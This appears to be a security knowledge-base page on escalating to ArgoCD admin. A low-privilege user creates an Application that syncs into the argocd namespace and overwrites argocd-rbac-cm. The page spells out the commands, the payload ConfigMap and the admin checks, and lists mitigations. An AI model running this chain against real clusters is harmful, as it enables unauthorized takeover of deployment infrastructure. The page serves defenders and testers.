---
title: Compromising ArgoCD via Application Sync
description: Steering an Application destination into the argocd namespace so the controller overwrites argocd-rbac-cm and the submitter becomes an ArgoCD admin
category: offensive
phase: privilege-escalation
createdAt: 2026-09-05
impact: An attacker who can create Applications under a permissive **AppProject** can set the destination to the argocd namespace and have the application-controller write attacker authored manifests with its own cluster identity. Overwriting `argocd-rbac-cm` promotes that identity to ArgoCD admin, which then reaches every Application, Project, registered cluster, and the controller ServiceAccount across the cluster
mitigation:
  - >-
    Restrict the **default AppProject**. Replace wildcard `sourceRepos`, `destinations`, and `clusterResourceWhitelist` with explicit allowlists, and add a `namespaceResourceBlacklist` covering ConfigMap, Secret, and RBAC kinds
  - >-
    Never grant ArgoCD RBAC as `applications, *, */*, allow`. Scope grants to a locked project, for example `applications, *, devproj/*, allow`
  - >-
    Ban the **argocd namespace** as a destination on every **AppProject** a subject who is not an admin can use. Treat a destination namespace of `argocd` as an admin only capability
  - Reject Applications whose destination is `argocd` from creators who are not admins with ValidatingAdmissionPolicy, Kyverno, or Gatekeeper, and alert on application-controller writes to `argocd-rbac-cm`, `argocd-cm`, or `argocd-secret`
mitreTechniques:
  - T1548
  - T1098
  - T1078
tools:
  - kubectl
references: |
  - [Weaponizing ArgoCD Application](/topics/weaponizing-argocd-application)
  - [Securing ArgoCD Application Access](/topics/securing-argocd-application-access)
  - [Argo CD RBAC](https://argo-cd.readthedocs.io/en/stable/operator-manual/rbac/)
  - [Argo CD AppProject](https://argo-cd.readthedocs.io/en/stable/user-guide/projects/)
  - [ApplicationSet security](https://argo-cd.readthedocs.io/en/stable/operator-manual/applicationset/Security/)
  - [API server does not enforce project sourceNamespaces](https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c)
---

ArgoCD takes manifests from git and applies them with the application-controller ServiceAccount, which can act across the cluster, to whatever destination the Application object names. The person who creates the Application chooses that destination.

Nothing in that model treats the `argocd` namespace as special. If an ArgoCD user with limited rights can create an Application under a project that permits it, they can set the destination to `argocd`, point the source at a git repo they control, and have the controller sync attacker authored manifests into ArgoCD's own control plane. The most useful object to write there is `argocd-rbac-cm`, the ConfigMap that decides who is an admin. Overwrite it with `policy.default: role:admin` and the user who submitted the Application is an ArgoCD admin on the next policy evaluation.

This is not a flaw in ArgoCD's code. It is the documented consequence of two configuration choices that ship enabled. One is a `default` **AppProject** with no restrictions. The other is RBAC grants that reach it. The restricted developer posture most teams believe they have is frequently one wildcard away from control plane compromise.

This chain is adjacent to [Weaponizing ArgoCD Application](/topics/weaponizing-argocd-application), which uses the same Application create primitive to deploy privileged workloads. Here the destination is ArgoCD itself, and the payload is the authorization store rather than a disguised DaemonSet.

## Understanding the attack surface

- **The project is the security boundary, and the default project has none.** ArgoCD scopes what an Application may do through its **AppProject**, not through per user destination rules. The `default` **AppProject** ships with `sourceRepos: ['*']`, `destinations: ['*','*']`, and `clusterResourceWhitelist: ['*','*']`. The documentation calls it the most permissive. Any Application under it may pull from any repo and deploy any resource to any namespace on any registered cluster.
- **ArgoCD RBAC does not limit where an Application deploys.** The ArgoCD RBAC `applications` object is `<app-project>/<app-name>` (or `<app-project>/<app-ns>/<app-name>` when applications may live in any namespace). It governs which project and application name a subject may act on. It has no field for destination namespace or destination cluster. Those are the project's job. A grant that lets a user create Applications in the `default` project therefore lets them deploy into `argocd`.
- **Understand that the controller syncs as itself.** The application-controller applies fetched manifests with its own privileged ServiceAccount. The submitter's Kubernetes permissions are never consulted for that write.

> [!IMPORTANT]
> A grant like `p, role:dev, applications, *, */*, allow` looks scoped. The object pattern is `<project>/<app-name>`, so `*/*` means every project, including `default`. That wildcard is what turns Application create into a control plane write. A genuinely restricted developer is scoped to a locked project (`p, role:dev, applications, *, devproj/*, allow`). Then this technique fails, because `devproj` forbids the `argocd` destination.

Taken together, Application create in a permissive project is a write primitive into the control plane namespace, executed with the controller's cluster identity.

## RBAC permissions

The attacker needs an ArgoCD account that can create Applications under a project that permits an `argocd` destination. On a default install, that is the `default` project.

```text
p, role:dev, applications, *, */*, allow
g, lowpriv, role:dev
```

`policy.default` may even be `role:readonly`. The explicit `role:dev` binding is what carries the create verb. No Kubernetes RBAC is required. The attacker acts through the ArgoCD API, and the controller supplies the cluster side privilege.

These environmental preconditions are all defaults on the official chart.

- The `default` **AppProject** is unrestricted.
- No admission webhook validates Applications.
- repo-server egress is unrestricted. The chart's NetworkPolicies are ingress only, so the attacker's git repo can be a pod in any tenant namespace serving `git://`.

## The attack sequence

### Step 1. Serve the payload from inside the cluster

The cluster must be able to reach the source repo. Because repo-server egress is open, a pod in any namespace the attacker already holds is enough.

```bash
git daemon --base-path=/tmp --export-all --reuseaddr --port=9418
```

Seed it with the escalation manifest under the sync path.

```yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: argocd-rbac-cm
  namespace: argocd
data:
  policy.default: role:admin
```

`argocd-rbac-cm` is a ConfigMap, so project level Secret blacklists never touch it. `policy.default: role:admin` makes every authenticated subject an admin. A surgical attacker instead appends a single `p, lowpriv, *, *, */*, allow` line to `policy.csv` to avoid promoting everyone.

### Step 2. Create an Application into argocd

From the compromised pod, download the `argocd` CLI. Later steps then reach `argocd-server` over in cluster DNS.

```bash
curl -sSL -o argocd https://github.com/argoproj/argo-cd/releases/latest/download/argocd-linux-amd64
chmod +x argocd
```

Authenticate as the restricted user and create an Application whose destination is `argocd`.

```bash
argocd app create atk-rbac-app \
  --repo git://<pod-ip>:9418/payload.git --path guestbook \
  --dest-server https://kubernetes.default.svc --dest-namespace argocd \
  --sync-policy automated --project default \
  --server argocd-server.argocd.svc:443 --insecure --grpc-web
```

The Application is accepted and its status moves to `Synced`. The controller has now written attacker content into `argocd`. RBAC configuration is reloaded by the API server without a restart, so the change takes effect immediately.

### Step 3. Exercise admin

```bash
argocd account can-i update projects '*'
argocd proj create pwned-proj
```

```output
yes
```

A successful **AppProject** create means the restricted account is now an ArgoCD admin. The same action failed before `argocd-rbac-cm` changed.

> [!WARNING]
> `argocd account generate-token --account admin` immediately after the rewrite can still fail if the API server has not finished reloading policy. **AppProject** creation is the reliable escalation check. Retry `generate-token` after policy reloads. Failure on the first try does not undo the escalation.

## Other payloads in the same destination

Destination `argocd` plus a write performed with the controller's authority reaches more than the RBAC ConfigMap.

- **`argocd-cm`.** Writing `resource.customizations.*.health.lua` plants Lua that the application-controller executes, and `notifications.*` templates are an injection surface. Either write executes attacker code through the same Application sync.
- **Cluster takeover.** As ArgoCD admin, register or retarget a destination cluster and deploy cluster scoped resources. The `default` project's `clusterResourceWhitelist: ['*','*']` permits it. The controller ServiceAccount across the cluster is the ceiling.

## ArgoCD is behaving as configured

ArgoCD documents this outcome. The ApplicationSet security page names the exact scenario. A user who can create an Application under an unrestricted project (like `default`) can take control of Argo CD by modifying its RBAC ConfigMap.

Three design facts confirm the classification. The `default` project is permissive by documented intent, and the docs recommend dedicated locked projects. The project, not RBAC, is the destination boundary, so ArgoCD is behaving correctly when a permissive project permits a permissive destination. And the chain is the composition of both defaults an operator was advised to change.

The advisory precedent draws the line. [API server does not enforce project `sourceNamespaces`](https://github.com/argoproj/argo-cd/security/advisories/GHSA-2gvw-w6fj-7m3c) was a genuine bug because ArgoCD failed to enforce a restriction the operator had configured. Here the operator configured no restriction, left `default` open, granted a wildcard project, and ArgoCD did exactly what that configuration specifies.

A grant of `applications, */*` is not a restricted developer. Combined with a usable `default` **AppProject**, it lets that subject write into `argocd`. Apply the controls in [Securing ArgoCD Application Access](/topics/securing-argocd-application-access).
